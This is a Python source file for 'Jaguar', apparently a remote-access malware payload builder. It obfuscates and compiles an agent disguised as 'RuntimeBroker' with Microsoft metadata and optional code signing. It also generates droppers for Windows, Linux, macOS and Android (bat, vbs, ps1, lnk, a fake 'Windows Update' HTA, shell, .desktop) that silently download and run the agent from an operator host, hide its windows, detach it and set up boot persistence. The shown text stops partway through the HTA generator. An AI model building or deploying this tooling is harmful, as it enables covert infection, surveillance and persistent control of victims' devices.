# -*- coding: utf-8 -*-
"""Constructor de payloads Jaguar (multiplataforma: Windows / Linux / macOS).

Cadena de ofuscacion/compilacion del exe:
  1) PyArmor  -> ofusca el agente
  2) Nuitka   -> compila (recomendado)
  3) PyInstaller -> fallback

OJO: PyInstaller/Nuitka NO cross-compilan. El binario se produce para el SO
donde ejecutes el builder. Para tener .exe + ELF + Mach-O hay que compilar en
cada uno.

Formatos y su alcance:
  .py       -> UNIVERSAL (Windows/Linux/macOS/Android-Termux). Base real.
  .sh       -> dropper Linux / macOS / Termux
  .desktop  -> lanzador Linux
  .command  -> lanzador macOS
  .exe      -> binario Windows (solo si compilas en Windows)
  .bat .vbs .lnk .hta .pdf .png .bas -> droppers Windows
"""
import functools
import os
import shutil
import stat
import struct
import subprocess
import sys
import tempfile
import time
import zlib
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

ES_WIN = sys.platform.startswith("win")
ES_LINUX = sys.platform.startswith("linux")
ES_MAC = sys.platform.startswith("darwin")
SO = "windows" if ES_WIN else ("linux" if ES_LINUX else ("macos" if ES_MAC else "otro"))
CREATE_NO_WINDOW = 0x08000000

DEPS_STDLIB = ["io", "time", "base64", "socket", "getpass", "platform", "shutil"]
DEPS_TERCEROS = ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2"]


def _sc():
    return {"creationflags": CREATE_NO_WINDOW} if ES_WIN else {}


class Constructor:
    def __init__(self, host, puerto, log=None, nombre="RuntimeBroker",
                 icono=None, upx=None, certificado=None, contrasena_cert=None,
                 compilador="auto", lto=False, mingw=False, usar_pyarmor=True,
                 matar_payload=True, puerto_http=8080):
        self.host = (host or "127.0.0.1").strip()
        self.puerto = str(puerto or "8000").strip()
        self.log = log or (lambda t: None)
        self.nombre = (nombre or "RuntimeBroker").strip()
        self.icono = icono or None
        self.upx = upx or None
        self.certificado = certificado or None
        self.contrasena_cert = contrasena_cert or None
        self.compilador = (compilador or "auto").lower()
        self.lto = bool(lto)
        self.mingw = bool(mingw)
        self.usar_pyarmor = bool(usar_pyarmor)
        self.matar_payload = bool(matar_payload)
        self.puerto_http = int(puerto_http or 8080)

        self.base = os.path.dirname(os.path.abspath(__file__))
        self.raiz = os.path.dirname(os.path.dirname(self.base))
        self.dist = os.path.join(self.raiz, "dist")
        self.build = os.path.join(self.raiz, "build_jaguar")
        self.agente = self._localizar_agente()
        self.fallback = self._ip_local()
        self._http = None
        if not self.agente:
            raise FileNotFoundError("No se encontró agente/agente.py")
        os.makedirs(self.dist, exist_ok=True)

    # ------------------------------------------------------------------ util
    def _localizar_agente(self):
        cands = [
            os.path.join(self.raiz, "agente", "agente.py"),
            os.path.join(self.raiz, "agente.py"),
            os.path.join(self.raiz, "jaguar", "agente", "agente.py"),
            os.path.join(self.base, "agente.py"),
        ]
        for c in cands:
            if os.path.isfile(c):
                self.log(f"[builder] agente.py encontrado en: {c}")
                return c
        self.log(f"[builder] ERROR: no encontré agente.py (busqué en {self.raiz})")
        return None

    @staticmethod
    def _ip_local():
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return ""
        finally:
            s.close()

    def _host_url(self):
        h = (self.host or "").strip()
        if h in ("", "0.0.0.0", "127.0.0.1"):
            h = self.fallback or h or "127.0.0.1"
        return h

    def _url(self, archivo):
        return f"http://{self._host_url()}:{self.puerto_http}/{archivo}"

    def _url_exe(self):
        return self._url(self.nombre + (".exe" if ES_WIN else ""))

    def _url_py(self):
        return self._url(self.nombre + ".py")

    def _url_sh(self):
        return self._url(self.nombre + ".sh")

    def _out(self, nombre):
        return os.path.join(self.dist, nombre)

    def _escribir(self, ruta, texto, binario=False):
        modo = "wb" if binario else "w"
        kwargs = {} if binario else {"encoding": "utf-8", "newline": ""}
        with open(ruta, modo, **kwargs) as f:
            f.write(texto)
        try:
            if not binario and ruta.endswith((".sh", ".command")):
                os.chmod(ruta, 0o755)
            if ruta.endswith(".desktop"):
                os.chmod(ruta, 0o755)
        except Exception:
            pass
        self.log(f"[builder] creado: {os.path.basename(ruta)}")
        return ruta

    def _cabecera_arranque(self):
        """Prefijo que incrusta host/puerto/fallback en un .py autónomo."""
        return (
            "# -*- coding: utf-8 -*-\n"
            "# --- configuracion incrustada por Jaguar Builder ---\n"
            "import os as _os, sys as _sys\n"
            f"_HOST = {self.host!r}\n"
            f"_PORT = {self.puerto!r}\n"
            f"_HOST2 = {self.fallback!r}\n"
            "_os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
            "_os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
            "_os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
            "_sys.argv = [_sys.argv[0], _HOST, _PORT, _HOST2]\n"
        )

    @staticmethod
    def _sello():
        return f"{time.strftime('%Y%m%d_%H%M%S')}_{os.getpid()}"

    def _rmtree_robusto(self, ruta, intentos=4):
        if not ruta or not os.path.isdir(ruta):
            return True

        def _forzar(func, path):
            try:
                os.chmod(path, stat.S_IWRITE | stat.S_IREAD)
                func(path)
            except Exception:
                pass

        for _ in range(intentos):
            try:
                if sys.version_info >= (3, 12):
                    shutil.rmtree(ruta, onexc=lambda f, p, e: _forzar(f, p))
                else:
                    shutil.rmtree(ruta, onerror=lambda f, p, e: _forzar(f, p))
            except Exception:
                pass
            if not os.path.isdir(ruta):
                return True
            time.sleep(0.6)
        return not os.path.isdir(ruta)

    def _matar_payload(self):
        if not ES_WIN:
            return
        exe = self.nombre + ".exe"
        try:
            r = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {exe}", "/NH"],
                               capture_output=True, text=True, **_sc())
            if exe.lower() in (r.stdout or "").lower():
                subprocess.run(["taskkill", "/IM", exe, "/F", "/T"],
                               capture_output=True, text=True, **_sc())
                self.log(f"[builder] cerradas instancias de {exe} antes de compilar")
                time.sleep(0.8)
        except Exception as e:
            self.log(f"[builder] aviso al comprobar procesos: {e}")

    def _limpiar_builds_viejos(self, conservar=()):
        try:
            for n in os.listdir(self.build):
                if n.startswith(("work_", "dist_tmp_")) and n not in conservar:
                    self._rmtree_robusto(os.path.join(self.build, n))
        except Exception:
            pass

    # ------------------------------------------------------------------ icono
    def _icono_ico(self):
        if self.icono and os.path.isfile(self.icono):
            if self.icono.lower().endswith((".ico", ".png")):
                return os.path.abspath(self.icono)
            try:
                from PIL import Image
                destino = os.path.join(self.dist, self.nombre + ".ico")
                Image.open(self.icono).convert("RGBA").save(
                    destino, sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)])
                return destino
            except Exception as e:
                self.log(f"[builder] no pude convertir icono dado: {e}")
        for cand in ("jaguar.ico", "jaguar.png"):
            p = os.path.join(self.raiz, "jaguar", "ui", cand)
            if not os.path.isfile(p):
                p = os.path.join(self.raiz, "img", cand)
            if os.path.isfile(p):
                if p.lower().endswith((".ico", ".png")):
                    return p
                try:
                    from PIL import Image
                    destino = os.path.join(self.dist, self.nombre + ".ico")
                    Image.open(p).convert("RGBA").save(
                        destino, sizes=[(16, 16), (32, 32), (48, 48), (64, 64),
                                        (256, 256)])
                    return destino
                except Exception as e:
                    self.log(f"[builder] no pudo convertir icono: {e}")
        return None

    # ------------------------------------------------------------------ entry
    def _entry(self):
        calentamiento = (
            "# --- warm-up de imports (visibles aunque el agente vaya ofuscado) ---\n"
            f"import {', '.join(DEPS_STDLIB)}\n"
            "try:\n"
            "    import winreg\n"
            "except Exception:\n"
            "    pass\n"
            "try:\n"
            f"    import {', '.join(DEPS_TERCEROS)}\n"
            "except Exception:\n"
            "    pass\n"
        )
        desprender = (
            "DETACHED_PROCESS = 0x00000008\n"
            "CREATE_NEW_PROCESS_GROUP = 0x00000200\n"
            "CREATE_NO_WINDOW = 0x08000000\n"
            "def _entorno_limpio():\n"
            "    env = os.environ.copy()\n"
            "    for _k in list(env):\n"
            "        if _k.startswith('_PYI_') or _k in ('_MEIPASS', '_MEIPASS2'):\n"
            "            env.pop(_k, None)\n"
            "    env['PYINSTALLER_RESET_ENVIRONMENT'] = '1'\n"
            "    return env\n"
            "if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
            "    subprocess.Popen(\n"
            "        [sys.executable, '--jaguar-detached', _HOST, _PORT],\n"
            "        env=_entorno_limpio(),\n"
            "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | "
            "CREATE_NO_WINDOW,\n"
            "        close_fds=True)\n"
            "    sys.exit(0)\n"
            "elif not sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
            "    try:\n"
            "        if os.fork() != 0:\n"
            "            sys.exit(0)\n"
            "    except Exception:\n"
            "        pass\n"
        )
        return (
            "import os, sys, subprocess\n"
            "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
            f"_HOST = {self.host!r}\n"
            f"_PORT = {self.puerto!r}\n"
            f"_HOST2 = {self.fallback!r}\n"
            "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
            "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
            "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
            + desprender
            + "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
            + calentamiento
            + "import agente_jaguar as agente\n"
            "agente.main()\n"
        )

    # ------------------------------------------------------------------ detect
    @staticmethod
    def _tiene_nuitka():
        try:
            return subprocess.run([sys.executable, "-m", "nuitka", "--version"],
                                  capture_output=True, text=True, **_sc()).returncode == 0
        except Exception:
            return False

    @staticmethod
    def _tiene_pyarmor():
        try:
            return subprocess.run([sys.executable, "-m", "pyarmor.cli", "--version"],
                                  capture_output=True, text=True, **_sc()).returncode == 0
        except Exception:
            return False

    # ------------------------------------------------------------------ pyarmor
    def _limpiar_pyarmor(self):
        for n in os.listdir(self.build):
            if n.startswith("pyarmor_runtime"):
                self._rmtree_robusto(os.path.join(self.build, n))
        self._rmtree_robusto(os.path.join(self.build, "pyarmor_out"))

    def _obfuscar_pyarmor(self):
        self._limpiar_pyarmor()
        src = os.path.join(self.build, "agente_jaguar.py")
        if not os.path.isfile(src):
            return None
        out = os.path.join(self.build, "pyarmor_out")
        intentos = (
            ["gen", "-O", out, "--obf-code", "2", src],
            ["gen", "-O", out, src],
            ["gen", "--output=" + out, src],
        )
        ok = False
        for args in intentos:
            try:
                proc = subprocess.run([sys.executable, "-m", "pyarmor.cli"] + args,
                                      cwd=self.build, capture_output=True, text=True,
                                      **_sc())
            except Exception as e:
                self.log(f"[builder] PyArmor excepción: {e}")
                continue
            if proc.returncode == 0 and os.path.isdir(out):
                ok = True
                break
            self.log(f"[builder] PyArmor falló (rc={proc.returncode}): "
                     + ((proc.stderr or proc.stdout or "").strip()[-500:]))
        if not ok:
            return None

        runtime = None
        for name in os.listdir(out):
            p = os.path.join(out, name)
            if name.startswith("pyarmor_runtime") and os.path.isdir(p):
                runtime = name
                shutil.copytree(p, os.path.join(self.build, name), dirs_exist_ok=True)
            elif name == "agente_jaguar.py":
                shutil.copy2(p, src)
        if runtime:
            self.log(f"[builder] PyArmor OK (runtime={runtime})")
        return runtime

    # ------------------------------------------------------------------ exe
    def _nombre_binario(self):
        return self.nombre + (".exe" if ES_WIN else "")

    def generar_exe(self):
        try:
            if not self.agente or not os.path.isfile(self.agente):
                self.log("[builder] ERROR exe: falta agente.py")
                return None
            os.makedirs(self.build, exist_ok=True)
            if self.matar_payload:
                self._matar_payload()

            shutil.copy2(self.agente, os.path.join(self.build, "agente_jaguar.py"))
            self._escribir(os.path.join(self.build, "_entry.py"), self._entry())

            runtime = None
            deps = None
            if self.usar_pyarmor:
                if self._tiene_pyarmor():
                    runtime = self._obfuscar_pyarmor()
                    if runtime:
                        shutil.copy2(self.agente, os.path.join(self.build,
                                                               "agente_deps.py"))
                        deps = "agente_deps"
                        self.log("[builder] agente_deps.py -> análisis de dependencias")
                else:
                    self.log("[builder] PyArmor no instalado -> sigo sin ofuscar")

            sello = self._sello()
            work = os.path.join(self.build, "work_" + sello)
            dist_tmp = os.path.join(self.build, "dist_tmp_" + sello)
            self._rmtree_robusto(work)
            self._rmtree_robusto(dist_tmp)
            os.makedirs(work, exist_ok=True)
            os.makedirs(dist_tmp, exist_ok=True)

            origen = None
            if self.compilador in ("auto", "nuitka"):
                if self._tiene_nuitka():
                    origen = self._compilar_nuitka(dist_tmp, work, runtime, deps)
                else:
                    self.log("[builder] Nuitka no instalado -> PyInstaller")
            if not origen:
                origen = self._compilar_pyinstaller(dist_tmp, work, runtime, deps)
            if not origen or not os.path.isfile(origen):
                self.log("[builder] ERROR exe: no se produjo salida")
                return None

            destino = self._colocar_exe(origen)
            self._firmar(destino)
            self.log(f"[builder] binario listo ({SO}): {os.path.basename(destino)}")
            self._limpiar_builds_viejos(conservar=(os.path.basename(work),
                                                   os.path.basename(dist_tmp)))
            return destino
        except Exception as e:
            self.log(f"[builder] ERROR exe: {e}")
            return None

    def _nuitka_cmd(self, dist_tmp, extra, runtime, deps):
        cmd = [sys.executable, "-m", "nuitka",
               "--onefile",
               "--assume-yes-for-downloads",
               "--remove-output",
               "--enable-plugin=numpy",
               "--include-package=PIL",
               "--include-package=cv2",
               f"--output-filename={self.nombre}" + (".exe" if ES_WIN else ""),
               f"--output-dir={dist_tmp}"]
        if ES_WIN:
            cmd += ["--windows-console-mode=disable",
                    "--include-module=winreg",
                    "--company-name=Microsoft Corporation",
                    "--product-name=Windows",
                    f"--file-description={self.nombre}",
                    "--file-version=1.0.0.0",
                    "--product-version=1.0.0.0",
                    "--copyright=Microsoft Corporation"]
        cmd.append("--include-module=agente_jaguar")
        for m in DEPS_STDLIB + (["subprocess", "winreg"] if ES_WIN else ["subprocess"]):
            cmd.append(f"--include-module={m}")
        if deps:
            cmd.append(f"--include-module={deps}")
        if runtime:
            cmd += [f"--include-package={runtime}",
                    f"--include-package-data={runtime}"]
        if self.lto:
            cmd.append("--lto=yes")
        ico = self._icono_ico()
        if ico:
            cmd.append(f"--windows-icon-from-ico={ico}" if ES_WIN else f"--icon={ico}")
        cmd += list(extra)
        cmd.append("_entry.py")
        return cmd

    def _correr_stream(self, cmd, cwd):
        self.log("[builder] $ " + " ".join(str(c) for c in cmd))
        p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True,
                             encoding="utf-8", errors="replace", bufsize=1, **_sc())
        ultimas = []
        for ln in p.stdout:
            ln = ln.rstrip()
            if not ln:
                continue
            ultimas.append(ln)
            del ultimas[:-25]
            if any(k in ln for k in ("Nuitka", "Compiling", "Scons", "gcc",
                                     "cl.exe", "link.exe", "Progress", "error",
                                     "Error", "download", "cache", "backend")):
                self.log("[nuitka] " + ln)
        p.wait()
        return p.returncode, "\n".join(ultimas)

    def _compilar_nuitka(self, dist_tmp, work, runtime, deps):
        exe = os.path.join(dist_tmp, self._nombre_binario())
        intentos = [["--mingw64"]] if (self.mingw and ES_WIN) else [[], ["--mingw64"]]
        if not ES_WIN:
            intentos = [[]]
        for extra in intentos:
            self.log(f"[builder] compilando con Nuitka {extra or '[nativo]'}... "
                     "(varios minutos)")
            try:
                rc, cola = self._correr_stream(
                    self._nuitka_cmd(dist_tmp, extra, runtime, deps), self.build)
            except Exception as e:
                self.log(f"[builder] Nuitka excepción: {e}")
                continue
            if rc == 0 and os.path.isfile(exe):
                return exe
            self.log("[builder] Nuitka falló:\n" + cola[-1500:])
        return None

    def _compilar_pyinstaller(self, dist_tmp, work, runtime, deps, intentos=3):
        exe = os.path.join(dist_tmp, self._nombre_binario())
        ocultos = ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2"] + DEPS_STDLIB + ["subprocess"]
        if ES_WIN:
            ocultos.append("winreg")
        salida = ""
        for i in range(intentos):
            cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
                   "--onefile", "--clean",
                   "--name", self.nombre,
                   "--distpath", dist_tmp,
                   "--workpath", work,
                   "--specpath", work,
                   "--paths", self.build]
            if ES_WIN:
                cmd.append("--noconsole")
            for m in ocultos:
                cmd += ["--hidden-import", m]
            if deps:
                cmd += ["--hidden-import", deps]
            if runtime:
                cmd += ["--collect-all", runtime]
            ico = self._icono_ico()
            if ico:
                cmd += ["--icon", ico]
            if self.upx and os.path.isdir(self.upx):
                cmd += ["--upx-dir", os.path.abspath(self.upx)]
            else:
                cmd += ["--noupx"]
            cmd += ["_entry.py"]

            self.log(f"[builder] compilando con PyInstaller (intento {i + 1}/{intentos})...")
            try:
                proc = subprocess.run(cmd, cwd=self.build, capture_output=True,
                                      text=True, **_sc())
            except Exception as e:
                self.log(f"[builder] PyInstaller excepción: {e}")
                proc = None
            salida = ((proc.stderr or "") + "\n" + (proc.stdout or "")) if proc else ""
            if proc is not None and proc.returncode == 0 and os.path.isfile(exe):
                return exe
            if i < intentos - 1:
                self.log("[builder] fallo de build (archivo bloqueado?), reintentando...")
                self._rmtree_robusto(work)
                self._rmtree_robusto(dist_tmp)
                os.makedirs(work, exist_ok=True)
                os.makedirs(dist_tmp, exist_ok=True)
                time.sleep(1.5)
        self.log("[builder] ERROR PyInstaller:\n" + salida[-1800:])
        return None

    def _colocar_exe(self, origen, intentos=5):
        ext = ".exe" if ES_WIN else ""
        for i in range(intentos):
            nombre = self.nombre + (ext if i == 0 else f"_{i + 1}{ext}")
            destino = os.path.join(self.dist, nombre)
            try:
                if os.path.isfile(destino):
                    try:
                        os.replace(origen, destino)
                    except PermissionError:
                        try:
                            os.remove(destino + ".old")
                        except OSError:
                            pass
                        os.rename(destino, destino + ".old")
                        os.replace(origen, destino)
                else:
                    os.replace(origen, destino)
                return destino
            except (PermissionError, OSError):
                continue
        destino = os.path.join(self.dist, f"{self.nombre}_{int(time.time())}{ext}")
        shutil.copy2(origen, destino)
        return destino

    def _firmar(self, exe):
        if not (ES_WIN and self.certificado and os.path.isfile(self.certificado)):
            return
        if not shutil.which("signtool"):
            self.log("[builder] signtool no encontrado, salto firma")
            return
        cmd = ["signtool", "sign", "/f", os.path.abspath(self.certificado),
               "/fd", "SHA256", "/tr", "http://timestamp.digicert.com", "/td", "SHA256"]
        if self.contrasena_cert:
            cmd += ["/p", self.contrasena_cert]
        cmd += [exe]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, **_sc())
            self.log("[builder] firmado OK" if r.returncode == 0
                     else "[builder] firma falló: " + (r.stderr or "")[-400:])
        except Exception as e:
            self.log(f"[builder] ERROR firma: {e}")

    # ================================================================ UNIVERSAL
    def generar_py(self):
        """Un .py AUTONOMO con el host incrustado. Sirve en Windows/Linux/macOS/Android."""
        try:
            with open(self.agente, encoding="utf-8", errors="replace") as f:
                fuente = f.read()
        except Exception as e:
            self.log(f"[builder] ERROR py: {e}")
            return None
        return self._escribir(self._out(self.nombre + ".py"),
                              self._cabecera_arranque() + "\n" + fuente)

    def _bat_compacto(self):
        return (
            "@echo off\r\n"
            f"set U={self._url_exe()}\r\n"
            f"set D=%TEMP%\\{self.nombre}.exe\r\n"
            'powershell -NoP -C "(New-Object Net.WebClient).DownloadFile(\'%U%\',\'%D%\')"'
            " >nul 2>&1\r\n"
            'if exist "%D%" (start "" "%D%" & exit /b)\r\n'
            f"set PY={self._url_py()}\r\n"
            'set PYD=%TEMP%\\jaguar_py.py\r\n'
            'powershell -NoP -C "try{Invoke-WebRequest -UseBasicParsing -Uri \'%PY%\' '
            "-OutFile '%PYD%'}catch{}\" >nul 2>&1\r\n"
            'where pythonw >nul 2>&1 && start "" pythonw "%PYD%"\r\n'
            "exit /b\r\n"
        )

    # ================================================================ LINUX / MAC
    def generar_sh(self):
        """Dropper shell: funciona en Linux, macOS y Termux (Android).

        Prioridad: binario local del SO -> .py con host incrustado.
        Detecta python3/python y curl/wget. Se desprende con nohup/setsid.
        """
        nombre_py = self.nombre + ".py"
        L = [
            "#!/bin/sh",
            "# Jaguar dropper (Linux / macOS / Termux)",
            f'URL_BIN="{self._url(self.nombre)}"',
            f'URL_PY="{self._url(nombre_py)}"',
            'DEST="$HOME/.jaguar_agente.py"',
            'BIN="$HOME/.jaguar_agente_bin"',
            'AGO="--jaguar-detached"',
            "",
            "_bajar() {",
            '  if command -v curl >/dev/null 2>&1; then curl -fsSL "$1" -o "$2" 2>/dev/null; return $?; fi',
            '  if command -v wget >/dev/null 2>&1; then wget -qO "$2" "$1" 2>/dev/null; return $?; fi',
            '  return 1',
            "}",
            "",
            "# 1) binario nativo del SO (si el builder lo genero para esta plataforma)",
            'if _bajar "$URL_BIN" "$BIN" && [ -s "$BIN" ]; then',
            '  chmod +x "$BIN" 2>/dev/null',
            '  if "$BIN" --version >/dev/null 2>&1 || true; then',
            '    (setsid "$BIN" $AGO >/dev/null 2>&1 &) 2>/dev/null || '
            '(nohup "$BIN" $AGO >/dev/null 2>&1 &)',
            "    exit 0",
            "  fi",
            "fi",
            "",
            "# 2) fallback universal: el .py",
            "PY=\"\"",
            'for c in python3 python; do command -v $c >/dev/null 2>&1 && PY=$c && break; done',
            'if [ -z "$PY" ]; then',
            '  echo "[jaguar] no hay python; instala python3 y reintenta"',
            "  exit 1",
            "fi",
            '_bajar "$URL_PY" "$DEST" || exit 1',
            'chmod +x "$DEST" 2>/dev/null',
            '(setsid "$PY" "$DEST" $AGO >/dev/null 2>&1 &) 2>/dev/null || '
            'nohup "$PY" "$DEST" $AGO >/dev/null 2>&1 &',
            "exit 0",
            "",
        ]
        return self._escribir(self._out(self.nombre + ".sh"), "\n".join(L))

    def generar_desktop(self):
        """Lanzador .desktop para Linux (doble clic). Autocontenido via curl."""
        contenido = "\n".join([
            "[Desktop Entry]",
            "Type=Application",
            f"Name={self.nombre}",
            "Comment=Jaguar agent",
            "Terminal=false",
            f"Icon={self._icono_ico() or 'utilities-terminal'}",
            f'Exec=sh -c "curl -fsSL \'{self._url_sh()}\' | sh"',
            "Categories=Utility;",
            "StartupNotify=false",
            "",
        ])
        return self._escribir(self._out(self.nombre + ".desktop"), contenido)

    def generar_command(self):
        """Lanzador .command para macOS (doble clic en Finder)."""
        contenido = "\n".join([
            "#!/bin/sh",
            "# Jaguar dropper (macOS)",
            'cd "$(dirname "$0")" || exit 1',
            f'LOCAL="./{self.nombre}.sh"',
            'if [ -f "$LOCAL" ]; then sh "$LOCAL"; exit 0; fi',
            f'curl -fsSL "{self._url_sh()}" -o /tmp/.jaguar.sh 2>/dev/null '
            '|| exit 1',
            'sh /tmp/.jaguar.sh',
            "",
        ])
        return self._escribir(self._out(self.nombre + ".command"), contenido)

    def generar_android(self):
        """Dropper especifico Termux: pide storage, baja el .py y lo deja en boot."""
        contenido = "\n".join([
            "#!/data/data/com.termux/files/usr/bin/sh",
            "# Jaguar dropper (Android / Termux)",
            "# Requiere: pkg install python termux-api && termux-setup-storage",
            f'URL_PY="{self._url_py()}"',
            'DEST="$HOME/.jaguar_agente.py"',
            "",
            "command -v python >/dev/null 2>&1 || { "
            "pkg install -y python >/dev/null 2>&1; }",
            "command -v termux-battery-status >/dev/null 2>&1 || { "
            "pkg install -y termux-api >/dev/null 2>&1; }",
            "",
            'curl -fsSL "$URL_PY" -o "$DEST" || '
            'wget -qO "$DEST" "$URL_PY" || exit 1',
            'chmod +x "$DEST" 2>/dev/null',
            "",
            "# persistencia: Termux:Boot",
            'BOOT="$HOME/.termux/boot"',
            'mkdir -p "$BOOT"',
            'printf \'#!/data/data/com.termux/files/usr/bin/sh\\n'
            'termux-wake-lock\\npython $HOME/.jaguar_agente.py &\\n\' > "$BOOT/jaguar.sh"',
            'chmod +x "$BOOT/jaguar.sh"',
            "",
            "termux-wake-lock 2>/dev/null",
            'nohup python "$DEST" >/dev/null 2>&1 &',
            "exit 0",
            "",
        ])
        return self._escribir(self._out(self.nombre + ".android.sh"), contenido)

    # ================================================================ WINDOWS
    def generar_bat(self):
        L = [
            "@echo off",
            "setlocal enableextensions",
            f'set "URL={self._url_exe()}"',
            f'set "DEST=%TEMP%\\{self.nombre}.exe"',
            'powershell -NoProfile -ExecutionPolicy Bypass -Command '
            '"try{[Net.ServicePointManager]::SecurityProtocol=3072;'
            "Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%DEST%'}catch{}\""
            " >nul 2>&1",
            'if exist "%DEST%" (start "" "%DEST%" & exit /b)',
            "rem --- fallback: .py con host incrustado ---",
            f'set "PYURL={self._url_py()}"',
            'set "PYDEST=%TEMP%\\jaguar_agente.py"',
            'powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing '
            "-Uri '%PYURL%' -OutFile '%PYDEST%'}catch{}\" >nul 2>&1",
            'where pythonw >nul 2>&1 && start "" pythonw "%PYDEST%"',
            "exit /b",
        ]
        return self._escribir(self._out(self.nombre + ".bat"), "\r\n".join(L) + "\r\n")

    def generar_vbs(self):
        vbs = "\r\n".join([
            "Option Explicit",
            "Dim url, dest, http, st, sh, pyurl, pydest",
            f'url = "{self._url_exe()}"',
            'Set sh = CreateObject("WScript.Shell")',
            f'dest = sh.ExpandEnvironmentStrings("%TEMP%") & "\\{self.nombre}.exe"',
            "On Error Resume Next",
            'Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")',
            'If Err.Number <> 0 Then Err.Clear : Set http = CreateObject("MSXML2.XMLHTTP")',
            'http.Open "GET", url, False',
            "http.Send",
            "If http.Status = 200 Then",
            '  Set st = CreateObject("ADODB.Stream")',
            "  st.Type = 1 : st.Open : st.Write http.responseBody",
            "  st.SaveToFile dest, 2 : st.Close",
            '  sh.Run """" & dest & """", 0, False',
            "Else",
            "  Err.Clear",
            f'  pyurl = "{self._url_py()}"',
            '  pydest = sh.ExpandEnvironmentStrings("%TEMP%") & "\\jaguar_agente.py"',
            '  Set http = CreateObject("MSXML2.XMLHTTP")',
            '  http.Open "GET", pyurl, False',
            "  http.Send",
            "  If http.Status = 200 Then",
            '    Set st = CreateObject("ADODB.Stream")',
            "    st.Type = 1 : st.Open : st.Write http.responseBody",
            "    st.SaveToFile pydest, 2 : st.Close",
            '    sh.Run "pythonw """ & pydest & """", 0, False',
            "  End If",
            "End If",
        ]) + "\r\n"
        return self._escribir(self._out(self.nombre + ".vbs"), vbs)

    def generar_ps1(self):
        ps = "\r\n".join([
            "$ErrorActionPreference='SilentlyContinue'",
            f"$url='{self._url_exe()}'",
            f"$dest=Join-Path $env:TEMP '{self.nombre}.exe'",
            "try{[Net.ServicePointManager]::SecurityProtocol=3072; "
            "Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $dest}catch{}",
            "if (Test-Path $dest) { Start-Process -FilePath $dest -WindowStyle Hidden }",
            "else {",
            "  $py=Join-Path $env:TEMP 'jaguar_agente.py'",
            f"  try{{Invoke-WebRequest -UseBasicParsing -Uri '{self._url_py()}' "
            "-OutFile $py}catch{}",
            "  if (Test-Path $py) { Start-Process pythonw -ArgumentList $py "
            "-WindowStyle Hidden }",
            "}",
        ]) + "\r\n"
        return self._escribir(self._out(self.nombre + ".ps1"), ps)

    def generar_lnk(self):
        if not ES_WIN:
            self.log("[builder] .lnk requiere Windows; uso .desktop/.sh")
            return self.generar_sh()
        destino = self._out(self.nombre + ".lnk")
        comando = (f'powershell -NoP -W Hidden -C "iwr \'{self._url_exe()}\' -OutFile '
                   f'$env:TEMP\\{self.nombre}.exe; Start-Process $env:TEMP\\{self.nombre}.exe"')
        args = f'/c start "" {comando}'
        try:
            import win32com.client
            sh = win32com.client.Dispatch("WScript.Shell")
            lnk = sh.CreateShortCut(destino)
            lnk.TargetPath = os.path.join(os.environ.get("WINDIR", r"C:\Windows"),
                                          "System32", "cmd.exe")
            lnk.Arguments = args
            lnk.WorkingDirectory = self.dist
            lnk.WindowStyle = 7
            lnk.IconLocation = (self._icono_ico() or "") + ",0"
            lnk.Save()
            self.log(f"[builder] creado: {os.path.basename(destino)}")
            return destino
        except Exception as e:
            self.log(f"[builder] lnk sin pywin32 ({e}); uso cscript")
        if not (ES_WIN and shutil.which("cscript")):
            return self._escribir(self._out(self.nombre + ".url"),
                                  f"[InternetShortcut]\nURL=file:///{self.agente}\n")
        vbs = os.path.join(tempfile.gettempdir(), "jaguar_lnk.vbs")
        contenido = (
            'Set sh = CreateObject("WScript.Shell")\r\n'
            f'Set l = sh.CreateShortcut("{destino}")\r\n'
            f'l.TargetPath = "{os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "cmd.exe")}"\r\n'
            f'l.Arguments = "{args}"\r\n'
            f'l.WorkingDirectory = "{self.dist}"\r\n'
            "l.WindowStyle = 7\r\n"
            "l.Save\r\n"
        )
        with open(vbs, "w", encoding="utf-8") as f:
            f.write(contenido)
        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True,
                       **_sc())
        self.log(f"[builder] creado: {os.path.basename(destino)}")
        return destino

    def generar_hta(self):
        hta = (
            "<html><head><title>Windows Update</title>\r\n"
            '<HTA:APPLICATION ID="j" BORDER="none" SHOWINTASKBAR="no" '
            'WINDOWSTATE="minimize" SINGLEINSTANCE="yes" />\r\n'
            '<script language="VBScript">\r\n'
            "Sub Window_OnLoad\r\n"
            "  Dim sh, http, st, url, dest\r\n"
            "  On Error Resume Next\r\n"
            f'  url = "{self._url_exe()}"\r\n'
            '  Set sh = CreateObject("WScript.Shell")\r\n'
            f'  dest = sh.ExpandEnvironmentStrings("%TEMP%") & "\\{self.nombre}.exe"\r\n'
            '  Set http = CreateObject("MSXML2.XMLHTTP")\r\n'
            '  http.Open "GET", url, False\r\n'
            "  http.Send\r\n"
            "  If http.Status = 200 Then\r\n"
            '    Set st = CreateObject("ADODB.Stream")\r\n'
            "    st.Type = 1 : st.Open : st.Write http.responseBody\r\n"
            "    st.SaveToFile dest, 2 : st.Close\r\n"
